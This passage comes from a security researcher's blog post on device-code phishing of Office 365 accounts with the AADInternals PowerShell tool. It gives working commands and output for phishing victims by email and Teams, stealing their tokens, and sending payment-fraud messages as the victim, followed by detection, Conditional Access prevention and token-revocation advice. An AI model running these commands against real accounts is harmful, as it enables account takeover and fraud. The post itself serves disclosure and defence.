+<span class="nv">$EXOresponse</span> <span class="p">=</span> <span class="nb">Invoke-RestMethod</span> <span class="n">-UseBasicParsing</span> <span class="n">-Method</span> <span class="n">Post</span> <span class="n">-Uri</span> <span class="s2">&#34;https://login.microsoftonline.com/Common/oauth2/token&#34;</span> <span class="n">-Body</span> <span class="nv">$body</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+
+<span class="c"># Send email as the victim</span>
+<span class="nb">Send-AADIntOutlookMessage</span> <span class="n">-AccessToken</span> <span class="nv">$EXOresponse</span><span class="p">.</span><span class="n">access_token</span> <span class="n">-Recipient</span> <span class="s2">&#34;another.wictim@target.org&#34;</span> <span class="n">-Subject</span> <span class="s2">&#34;Overdue payment&#34;</span> <span class="n">-Message</span> <span class="s2">&#34;Pay this &lt;h2&gt;asap!&lt;/h2&gt;&#34;</span></code></pre></div>
+
+<h1 id="using-aadinternals-for-phishing">Using AADInternals for phishing</h1>
+
+<p>AADInternals (v0.4.4 or later) has an <a href="/aadinternals/#invoke-aadintphishing" target="_blank">Invoke-AADIntPhishing</a> function
+which automates the phishing process.</p>
+
+<p>The phishing message can be customised, the default message is following:</p>
+
+<pre><code>'&lt;div&gt;Hi!&lt;br/&gt;This is a message sent to you by someone who is using &lt;a href=&quot;https://o365blog.com/aadinternals&quot;&gt;AADInternals&lt;/a&gt; phishing function. &lt;br/&gt;&lt;br/&gt;Here is a &lt;a href=&quot;{1}&quot;&gt;link&lt;/a&gt; you &lt;b&gt;should not click&lt;/b&gt;.&lt;br/&gt;&lt;br/&gt;If you still decide to do so, provide the following code when requested: &lt;b&gt;{0}&lt;/b&gt;.&lt;/div&gt;'
+</code></pre>
+
+<p>Default message in email:<br>
+<img src="/images/posts/phishing_11.png" alt="Phishing email" /></p>
+
+<p>Default message in Teams:<br>
+<img src="/images/posts/phishing_12.png" alt="Phishing message" /></p>
+
+<h2 id="email">Email</h2>
+
+<p>The following example sends a phishing email using a customised message. The tokens are saved to the cache.
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create a custom message</span>
+<span class="nv">$message</span> <span class="p">=</span> <span class="s1">&#39;&lt;html&gt;Hi!&lt;br/&gt;Here is the link to the &lt;a href=&#34;{1}&#34;&gt;document&lt;/a&gt;. Use the following code to access: &lt;b&gt;{0}&lt;/b&gt;.&lt;/html&gt;&#39;</span>
+
+<span class="c"># Send a phishing email to recipients using a customised message and save the tokens to cache</span>
+<span class="nb">Invoke-AADPhishing</span> <span class="n">-Recipients</span> <span class="s2">&#34;wvictim@company.com&#34;</span><span class="p">,</span><span class="s2">&#34;wvictim2@company.com&#34;</span> <span class="n">-Subject</span> <span class="s2">&#34;Johnny shared a document with you&#34;</span> <span class="n">-Sender</span> <span class="s2">&#34;Johnny Carson &lt;jc@somewhere.com&gt;&#34;</span> <span class="n">-SMTPServer</span> <span class="n">smtp</span><span class="p">.</span><span class="n">myserver</span><span class="p">.</span><span class="n">local</span> <span class="n">-Message</span> <span class="nv">$message</span> <span class="n">-SaveToCache</span> </code></pre></div></p>
+
+<pre><code>Code: CKDZ2BURF
+Mail sent to: wvictim@company.com
+...
+Received access token for william.victim@company.com
+</code></pre>
+
+<p>And now we can send email as the victim using the cached token.
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Send email as the victim</span>
+<span class="nb">Send-AADIntOutlookMessage</span> <span class="n">-Recipient</span> <span class="s2">&#34;another.wictim@target.org&#34;</span> <span class="n">-Subject</span> <span class="s2">&#34;Overdue payment&#34;</span> <span class="n">-Message</span> <span class="s2">&#34;Pay this &lt;h2&gt;asap!&lt;/h2&gt;&#34;</span></code></pre></div></p>
+
+<p>We can also send a Teams message to make the payment request more urgent:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Send Teams message as the victim</span>
+<span class="nb">Send-AADIntTeamsMessage</span> <span class="n">-Recipients</span> <span class="s2">&#34;another.wictim@target.org&#34;</span> <span class="n">-Message</span> <span class="s2">&#34;Just sent you an email about due payment. Have a look at it.&#34;</span></code></pre></div></p>
+
+<pre><code>Sent                MessageID         
+----                ---------         
+16/10/2020 14.40.23 132473328207053858
+</code></pre>
+
+<p><strong>The following video shows how to use AADInternals for email phishing.</strong></p>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/Yz4zjD3EUUg" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+<h2 id="teams">Teams</h2>
+
+<p>AADInternals supports sending phishing messages as Teams chat messages.</p>
+
+<p><strong>Note!</strong> After the victim has &ldquo;authenticated&rdquo; and the tokens are received, AADInternals will replace the original message. This message can be provided with -CleanMessage parameter.</p>
+
+<p>The default clean message is:</p>
+
+<pre><code>'&lt;div&gt;Hi!&lt;br/&gt;This is a message sent to you by someone who is using &lt;a href=&quot;https://o365blog.com/aadinternals&quot;&gt;AADInternals&lt;/a&gt; phishing function. &lt;br/&gt;If you are seeing this, &lt;b&gt;someone has stolen your identity!&lt;/b&gt;.&lt;/div&gt;'
+</code></pre>
+
+<p><img src="/images/posts/phishing_13.png" alt="Teams clean message" /></p>
+
+<p>The following example sends a phishing email using customised messages. The tokens are saved to the cache.
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get access token for Azure Core Management</span>
+<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>
+
+<span class="c"># Create the custom messages</span>
+<span class="nv">$message</span> <span class="p">=</span> <span class="s1">&#39;&lt;html&gt;Hi!&lt;br/&gt;Here is the link to the &lt;a href=&#34;{1}&#34;&gt;document&lt;/a&gt;. Use the following code to access: &lt;b&gt;{0}&lt;/b&gt;.&lt;/html&gt;&#39;</span>
+<span class="nv">$cleanMessage</span> <span class="p">=</span> <span class="s1">&#39;&lt;html&gt;Hi!&lt;br/&gt;Have a nice weekend.&lt;/html&gt;&#39;</span>
+
+<span class="c"># Send a teams message to the recipient using customised messages</span>
+<span class="nb">Invoke-AADPhishing</span> <span class="n">-Recipients</span> <span class="s2">&#34;wvictim@company.com&#34;</span> <span class="n">-Teams</span> <span class="n">-Message</span> <span class="nv">$message</span> <span class="n">-CleanMessage</span> <span class="nv">$cleanMessage</span> <span class="n">-SaveToCache</span></code></pre></div></p>
+
+<pre><code>Code: CKDZ2BURF
+Teams message sent to: wvictim@company.com. Message id: 132473151989090816
+...
+Received access token for william.victim@company.com
+</code></pre>
+
+<p><strong>The following video shows how to use AADInternals for Teams phishing.</strong></p>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/FX20qa58TEQ" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+<h1 id="detecting">Detecting</h1>
+
+<p>First of all, from the Azure AD point-of-view the login takes place where the authentication was <strong>initiated</strong>. This is a very important point to understand.
+This means that in the signing log, the login was performed from the <strong>attacker location and device</strong>, not from user&rsquo;s.</p>
+
+<p>However, the access tokens acquired using the refresh token <strong>do not appear in signing log!</strong></p>
+
+<p>Below is an example where I initiated the phishing from an Azure VM (well, from the <a href="/post/cloudshell/" target="_blank">cloud shell</a> to be more specific). As we can see, the login using the &ldquo;Microsoft Office&rdquo; client took place at
+7:23 AM from the ip-address 51.144.240.233. However, getting the access token for Exchange Online at 7:27 AM is not shown in the log.</p>
+
+<dl>
+<dt><img src="/images/posts/phishing_10.png" alt="Azure AD signing log" /></dt>
+</dl>
+
+<p>:warning: If there are indications that the user is signing in from non-typical locations, the user account might be compromised.</p>
+
+<h1 id="preventing">Preventing</h1>
+
+<p>The only effective way for preventing phishing using this technique is to use <a href="https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview" target="_blank">Conditional Access</a> (CA) policies.
+To be specific, the <strong>phishing can not be prevented</strong>, but we can <strong>prevent users from signing in</strong> based on certain rules.
+Especially the location and device state based policies are effective for protecting accounts. This applies for the all phishing techniques currently used.</p>
+
+<p>However, it is not possible to cover all scenarios. For instance, forcing MFA for logins from illicit locations does not help if the user is logging in using MFA.</p>
+
+<h1 id="mitigating">Mitigating</h1>
+
+<p>If the user has been compromised, the user&rsquo;s refresh tokens can be <a href="https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0" target="_blank">revoked</a>, which
+prevents attacker getting new access tokens with the compromised refresh token.</p>
+
+<h1 id="summary">Summary</h1>
+
+<p>As far as I know, the device code authentication flow technique has not used for phishing before.</p>
+
+<p>From the attacker point of view, this method has a couple of pros:</p>
+
+<ul>
+<li>No need to register any apps</li>
+<li>No need to setup a phishing infrastructure for fake login pages etc.</li>
+<li>The user is only asked to sign in (usually to &ldquo;Microsoft Office&rdquo;) - no consents asked</li>
+<li>Everything happens in <strong>login.microsoftonline.com</strong> namespace</li>
+<li>Attacker can use any client_id and resource (not all combinations work though)</li>
+<li>If the user signed in using MFA, the access token also has MFA claim (this includes also the access tokens fetched using the refresh token)</li>
+<li>Preventing requires Conditional Access (and Azure AD Premium P1/P2 licenses)</li>
+</ul>
+
+<p>From the attacker point of view, this method has at least one con:</p>
+
+<ul>
+<li>The user code is valid only for 15 minutes</li>
+</ul>
+
+<p>Of course, the attacker can minimise the time restriction by sending the phishing email to multiple recipients - this will increase the probability that someone signs in using the code.</p>
+
+<p>Another way is to implement <a href="https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333" target="_blank">a proxy</a> which would start the authentication when the link is clicked (credits to <a href="https://twitter.com/MrUn1k0d3r" target="_blank">@MrUn1k0d3r</a>).
+However, this way the advantage of using a legit microsoft.com url would be lost.</p>
+
+<p>Checklist for surviving phishing campaings:</p>
+
+<ol>
+<li><strong>Educate your users</strong> about information security and phishing :woman_teacher:</li>
+<li>Use Multi-Factor Authentication (MFA) :iphone:</li>
+<li>Use Intune :hammer_and_wrench: and Conditional Access (CA) :stop_sign:</li>
+</ol>
+
+<h1 id="references">References</h1>
+
+<ul>
+<li>Phishing.org: <a href="https://phishing.org/what-is-phishing" target="_blank">What Is Phishing?</a></li>
+<li>Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-mfa-howitworks" target="_blank">How it works: Azure Multi-Factor Authentication</a></li>
+<li>@SantasaloJoosua: <a href="https://www.nixu.com/blog/demonstration-illicit-consent-grant-attack-azure-ad-office-365" target="_blank">Demonstration - Illicit consent grant attack in Azure AD/Office 365</a>.</li>
+<li>Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code" target="_blank">Microsoft identity platform and the OAuth 2.0 device authorization grant flow</a></li>
+<li>Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview" target="_blank">What is Conditional Access?</a></li>
+<li>Microsoft: <a href="https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0" target="_blank">Revoke-AzureADUserAllRefreshToken</a></li>
+<li>@MrUn1k0d3r: <a href="https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333" target="_blank">Office device code phishing proxy</a></li>
+</ul>
+		</div>
+		
+<div class="post__tags tags clearfix">
+	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
+	
+	<ul class="tags__list">
+		<li class="tags__item"><a class="tags__link" href="/tags/azure/" rel="tag">Azure</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/security/" rel="tag">security</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/phishing/" rel="tag">phishing</a></li>
+	</ul>
+</div>
+
+		<div class="post__tags tags clearfix">
+<ul class="tags__list">
+	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fphishing%2f&text=Introducing%20a%20new%20phishing%20technique%20for%20compromising%20Office%20365%20accounts&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fphishing%2f&mini=true&title=Introducing%20a%20new%20phishing%20technique%20for%20compromising%20Office%20365%20accounts&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+</ul>
+</div>
+	</article>
+	
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
+	</div>
+	<div class="authorbox__description">
+		Dr Syynimaa works as Senior Principal Information Security Researcher at Secureworks CTU (Counter Threat Unit). <br> Before moving to his current position, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Azure AD security. <br><br>Dr Syynimaa is Microsoft Certified Expert (Microsoft 365), Microsoft Certified Azure Solutions Architect Expert, Microsoft Certified Trainer, Microsoft MVP (Enterprise Mobility, Identity and Access &amp; Intune), and Microsoft Most Valuable Security Researcher (MVR).
+	</div>
+</div>
+	
+<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+	<div class="post-nav__item post-nav__item--prev col-1-2">
+		<a class="post-nav__link" href="/post/cloudshell/" rel="prev"><span class="post-nav__caption">«Previous</span><p class="post-nav__post-title">Using Azure Cloud Shell from PowerShell</p></a>
+	</div>
+	<div class="post-nav__item post-nav__item--next col-1-2">
+		<a class="post-nav__link" href="/post/cloudidentitysummit2020/" rel="next"><span class="post-nav__caption">Next»</span><p class="post-nav__post-title">AADInternals Cloud Identity Summit 2020 edition</p></a>
+	</div>
+</nav>
+
+	
+<div class="comments">
+	<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "o365blog-com" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+</main>
+
+<aside class="sidebar" itemscope="itemscope" itemtype="http://schema.org/WPSideBar">
+	
+<div class="widget-search widget">
+	<form class="widget-search__form" role="search" method="get" action="//google.com/search">
+		<label>
+			<span class="screen-reader-text">Search for:</span>
+			<input class="widget-search__field" type="search" placeholder="SEARCH..." value="" name="q">
+		</label>
+		<input class="widget-search__submit" type="submit" value="Search">
+		<input type="hidden" name="sitesearch" value="http://o365blog.com" />
+	</form>
+</div>
+	
+<div class="widget-recent widget">
+	<h4 class="widget__title">Recent Posts</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/post/pta/">Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/gmsa/">Hunt for the gMSA secrets</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/august_2022/">AADInternals World Tour August 2022: USA</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/deviceidentity/">Stealing and faking Azure AD device identities</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/partners/">Microsoft partners: The Good, The Bad, or The Ugly?</a></li>
+		</ul>
+	</div>
+</div>
+
+	
+<div class="widget-categories widget">
+	<h4 class="widget__title">Categories</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/categories/"></a></li>
+			<li class="widget__item"><a class="widget__link" href="/categories/article">Article</a></li>
+			<li class="widget__item"><a class="widget__link" href="/categories/blog">Blog</a></li>
+		</ul>
+	</div>
+</div>
+	
+<div class="widget-social widget">
+	<h4 class="widget-social__title widget__title">Social</h4>
+	<div class="widget-social__content widget__content">
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/DrAzureAD" target="_blank">
+				<svg class="widget-social__link-icon icon-twitter" viewBox="0 0 384 312" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
+				<span>Twitter</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="" rel="noopener noreferrer" href="https://linkedin.com/in/nestori" target="_blank">
+				<svg class="widget-social__link-icon icon-linkedin" viewBox="0 0 352 352" width="24" height="24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg>
+				<span>LinkedIn</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Email" href="mailto:nestori.syynimaa@gerenios.com">
+				<svg class="widget-social__link-icon icon-mail" viewBox="0 0 416 288" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
+				<span>nestori.syynimaa@gerenios.com</span>
+			</a>
+		</div>
+	</div>
+</div>
+
+	
+<div class="widget-taglist widget">
+	<h4 class="widget__title">Tags</h4>
+	<div class="widget__content">
+		<a class="widget__link widget__link--taglist" href="/tags/aadconnect" title="aadconnect">aadconnect (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/aadinternals" title="aadinternals">aadinternals (10)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/abusing" title="abusing">abusing (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/active-directory" title="active-directory">active-directory (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/adfs" title="adfs">adfs (5)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/admin" title="admin">admin (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/administration" title="administration">administration (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/authentication" title="authentication">authentication (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azure" title="azure">azure (20)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azure-active-directory" title="azure-active-directory">azure-active-directory (27)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azuread" title="azuread">azuread (4)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/backdoor" title="backdoor">backdoor (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/blackhat" title="blackhat">blackhat (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/blue-team" title="blue-team">blue-team (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/bprt" title="bprt">bprt (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/browser" title="browser">browser (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/compromise" title="compromise">compromise (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/conferences" title="conferences">conferences (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/defcon" title="defcon">defcon (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/desktop-sso" title="desktop-sso">desktop-sso (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/device" title="device">device (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/dns" title="dns">dns (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/email" title="email">email (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/encryption" title="encryption">encryption (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/exchange" title="exchange">exchange (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/federation" title="federation">federation (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/forensics" title="forensics">forensics (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/gdpr" title="gdpr">gdpr (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/global-administrator" title="global-administrator">global-administrator (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/graph" title="graph">graph (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/groups" title="groups">groups (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/guest" title="guest">guest (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/hybrid-join" title="hybrid-join">hybrid-join (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/identity" title="identity">identity (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/inactive" title="inactive">inactive (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/insider" title="insider">insider (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/intune" title="intune">intune (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/join" title="join">join (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/logs" title="logs">logs (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mailbox" title="mailbox">mailbox (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mdm" title="mdm">mdm (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mfa" title="mfa">mfa (6)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/office-365" title="office-365">office-365 (9)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/office365" title="office365">office365 (9)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/on-prem" title="on-prem">on-prem (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/onedrive" title="onedrive">onedrive (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/outsider" title="outsider">outsider (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/partner" title="partner">partner (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/password" title="password">password (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/persistence" title="persistence">persistence (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/phishing" title="phishing">phishing (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/planner" title="planner">planner (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/powershell" title="powershell">powershell (13)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/prt" title="prt">prt (6)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/pta" title="pta">pta (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/recon" title="recon">recon (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/reconnaissance" title="reconnaissance">reconnaissance (4)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/seamless-sso" title="seamless-sso">seamless-sso (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/security" title="security">security (31)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/sso" title="sso">sso (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/sync" title="sync">sync (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/synchronisation" title="synchronisation">synchronisation (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/t2" title="t2">t2 (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/talks" title="talks">talks (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/teams" title="teams">teams (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/user" title="user">user (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/virtual-machine" title="virtual-machine">virtual-machine (1)</a>
+	</div>
+</div>
+</aside>
+
+	</div>
+		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
+			<div class="container container-inner">
+				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
+			</div>
+		</footer>
+	</div>
+
+<script>
+	var navigation = responsiveNav(".menu", {
+		navClass: "menu--collapse",
+	});
+</script>
+</body>
+</html>
